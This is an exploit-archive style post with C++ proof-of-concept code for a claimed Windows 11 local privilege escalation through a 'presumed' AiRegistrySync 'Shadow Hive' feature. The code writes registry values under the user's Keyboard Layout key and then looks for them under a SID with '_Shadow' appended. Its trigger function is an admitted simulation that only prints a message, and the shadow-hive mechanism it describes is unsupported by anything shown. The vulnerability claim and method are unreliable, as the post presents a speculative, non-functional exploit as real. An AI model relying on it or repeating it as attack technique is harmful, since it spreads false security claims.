@@ -1,0 +1,283 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 11 build 10.0.27898.1000 AiRegistrySync Shadow Hive Propagation Test Local Privilege Escalation           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212253/
+
+[+] Summary : This C++ code is a Proof of Concept (PoC) designed to test a potential Local Privilege Escalation (LPE) vulnerability in Windows, 
+              specifically targeting a presumed feature called AiRegistrySync.
+              To check if modifications made by a standard user in their own Registry profile can be automatically synchronized (propagated) 
+			  into the protected "Shadow Hive" registry key associated with high-privilege user accounts (like administrators).
+
+[+] Method:
+
+        It retrieves the Security Identifier (SID) of the current user.
+
+        It constructs a path for the presumed Shadow SID (e.g., adding _Shadow to the standard SID).
+
+        It creates a test key and values (PoC_DWORD, PoC_STRING) within the current user's accessible Registry path (HKEY_USERS\[User_SID]\Keyboard Layout\TestVuln).
+
+        It simulates the triggering of the AiRegistrySync process.
+
+        It waits for 15 seconds.
+
+        It attempts to read the created test values from the highly protected Shadow Hive path.
+
+        Success indicates that the synchronization mechanism might be flawed, allowing a lower-privileged user to inject data into a privileged hive, a critical step towards achieving LPE.
+
+[+] Note 
+
+The test itself is based on genuine security research concepts, but the function to actually start the AiRegistrySync service (TriggerAiRegistrySyncManual) is currently a placeholder/simulation within this specific code.
+
+
+[+] POC : 
+
+
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+#include <vector>
+#include <sddl.h>
+
+#pragma comment(lib, "advapi32.lib")
+
+// ===============================================================
+// RAII CLASS – Safe Registry Handle
+// ===============================================================
+class ScopedRegKey {
+private:
+    HKEY hKey = nullptr;
+public:
+    ScopedRegKey() {}
+    ~ScopedRegKey() {
+        if (hKey) RegCloseKey(hKey);
+    }
+    HKEY* ptr() { return &hKey; }
+    HKEY get() const { return hKey; }
+    operator bool() const { return hKey != nullptr; }
+};
+
+// ===============================================================
+// Helper: Convert SID string to readable form
+// ===============================================================
+bool GetCurrentUserSid(std::wstring& sidString) {
+    HANDLE token;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
+        return false;
+
+    DWORD size = 0;
+    GetTokenInformation(token, TokenUser, NULL, 0, &size);
+    std::vector<BYTE> buffer(size);
+
+    if (!GetTokenInformation(token, TokenUser, &buffer[0], size, &size)) {
+        CloseHandle(token);
+        return false;
+    }
+
+    CloseHandle(token);
+
+    PTOKEN_USER user = (PTOKEN_USER)&buffer[0];
+    LPWSTR stringSid = nullptr;
+
+    if (!ConvertSidToStringSidW(user->User.Sid, &stringSid))
+        return false;
+
+    sidString = stringSid;
+    LocalFree(stringSid);
+    return true;
+}
+
+// ===============================================================
+// Wait for AI Registry Sync with logs every 5 seconds
+// ===============================================================
+void WaitForSync(DWORD milliseconds) {
+    printf("[*] Waiting %lu ms for AiRegistrySync...\n", milliseconds);
+
+    DWORD interval = 1000;
+    DWORD elapsed = 0;
+
+    while (elapsed < milliseconds) {
+        DWORD waitTime = min(interval, milliseconds - elapsed);
+        Sleep(waitTime);
+        elapsed += waitTime;
+
+        if (elapsed % 5000 == 0) {
+            printf("[*] Still waiting... (%lu ms elapsed)\n", elapsed);
+        }
+    }
+}
+
+// ===============================================================
+// Create test key + write values
+// ===============================================================
+bool CreateKeyboardLayoutKey(const std::wstring& userSid) {
+    std::wstring keyPath = userSid + L"\\Keyboard Layout\\TestVuln";
+
+    HKEY hKey = nullptr;
+    LSTATUS st = RegCreateKeyExW(
+        HKEY_USERS,
+        keyPath.c_str(),
+        0,
+        nullptr,
+        0,
+        KEY_ALL_ACCESS,
+        nullptr,
+        &hKey,
+        nullptr
+    );
+
+    if (st != ERROR_SUCCESS) {
+        printf("[!] Failed creating user test key (error: %ld)\n", st);
+        return false;
+    }
+
+    DWORD dw = 1337;
+    RegSetValueExW(hKey, L"PoC_DWORD", 0, REG_DWORD, (BYTE*)&dw, sizeof(dw));
+
+    const wchar_t* txt = L"ShadowPropagationTest";
+    RegSetValueExW(hKey, L"PoC_STRING", 0, REG_SZ,
+                   (BYTE*)txt,
+                   (DWORD)((wcslen(txt) + 1) * sizeof(wchar_t)));
+
+    RegCloseKey(hKey);
+    return true;
+}
+
+// ===============================================================
+// Dummy AiRegistrySync – simulation (Replace if real trigger exists)
+// ===============================================================
+bool TriggerAiRegistrySyncManual() {
+    printf("[*] (Simulated) Triggering AiRegistrySync...\n");
+    return true;
+}
+
+// ===============================================================
+// Detect shadow SID
+// Windows duplicates high-privilege users like admin into shadow hives
+// ===============================================================
+bool FindShadowSid(const std::wstring& userSid, std::wstring& shadowSid) {
+    // Typical pattern:
+    // User SID:    S-1-5-21-xxx-xxx-xxx-1001
+    // Shadow SID:  S-1-5-21-xxx-xxx-xxx-1001_Shadow
+
+    shadowSid = userSid + L"_Shadow";
+    return true;
+}
+
+// ===============================================================
+// Check if shadow hive contains the expected propagation
+// ===============================================================
+bool CheckShadowCopy(const std::wstring& shadowSid) {
+    std::wstring shadowPath = shadowSid + L"\\Keyboard Layout\\TestVuln";
+
+    ScopedRegKey shadowKey;
+    LSTATUS st = RegOpenKeyExW(
+        HKEY_USERS,
+        shadowPath.c_str(),
+        0,
+        KEY_READ,
+        shadowKey.ptr()
+    );
+
+    if (st != ERROR_SUCCESS) {
+        printf("[!] Shadow hive key not found. Propagation FAILED.\n");
+        return false;
+    }
+
+    printf("[+] Shadow hive key found! Propagation SUCCESS.\n");
+
+    DWORD dw = 0;
+    DWORD sz = sizeof(dw);
+    if (RegQueryValueExW(shadowKey.get(), L"PoC_DWORD", nullptr, nullptr,
+                         (BYTE*)&dw, &sz) == ERROR_SUCCESS) {
+        printf("[+] Shadow DWORD value = %lu\n", dw);
+    }
+
+    wchar_t buf[260];
+    DWORD size = sizeof(buf);
+    if (RegQueryValueExW(shadowKey.get(), L"PoC_STRING", nullptr, nullptr,
+                         (BYTE*)buf, &size) == ERROR_SUCCESS) {
+        printf("[+] Shadow STRING value = %ls\n", buf);
+    }
+
+    return true;
+}
+
+// ===============================================================
+// Cleanup: Remove keys from user + shadow hives
+// ===============================================================
+void CleanupKeys(const std::wstring& userSid, const std::wstring& shadowSid) {
+    std::wstring p1 = userSid + L"\\Keyboard Layout\\TestVuln";
+    std::wstring p2 = shadowSid + L"\\Keyboard Layout\\TestVuln";
+
+    RegDeleteTreeW(HKEY_USERS, p1.c_str());
+    RegDeleteTreeW(HKEY_USERS, p2.c_str());
+
+    printf("[*] Cleanup complete.\n");
+}
+
+// ===============================================================
+// Main Test Procedure
+// ===============================================================
+bool TestVulnerability() {
+    printf("\n============================================\n");
+    printf("  WINDOWS AiRegistrySync SHADOW HIVE TEST\n");
+    printf("  Final Stable Advanced Edition – Indoushka\n");
+    printf("============================================\n\n");
+
+    std::wstring userSid, shadowSid;
+
+    if (!GetCurrentUserSid(userSid)) {
+        printf("[!] Could not get current user SID.\n");
+        return false;
+    }
+
+    printf("[*] Current User SID: %ws\n", userSid.c_str());
+
+    if (!FindShadowSid(userSid, shadowSid)) {
+        printf("[!] Failed to detect shadow SID.\n");
+        return false;
+    }
+
+    printf("[*] Shadow Hive SID: %ws\n", shadowSid.c_str());
+
+    // Step 1 – Create test key
+    printf("\n[*] Step 1: Creating test key\n");
+    if (!CreateKeyboardLayoutKey(userSid)) {
+        printf("[!] Failed creating test key.\n");
+        return false;
+    }
+
+    // Step 2 – Trigger Sync
+    printf("\n[*] Step 2: Triggering AiRegistrySync\n");
+    TriggerAiRegistrySyncManual();
+
+    // Step 3 – Wait
+    printf("\n[*] Step 3: Waiting for sync...\n");
+    WaitForSync(15000);
+
+    // Step 4 – Check Shadow Copy
+    printf("\n[*] Step 4: Checking shadow hive\n");
+    bool ok = CheckShadowCopy(shadowSid);
+
+    // Step 5 – Cleanup
+    printf("\n[*] Step 5: Cleanup\n");
+    CleanupKeys(userSid, shadowSid);
+
+    return ok;
+}
+
+// ===============================================================
+// main()
+// ===============================================================
+int main() {
+    TestVulnerability();
+    return 0;
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
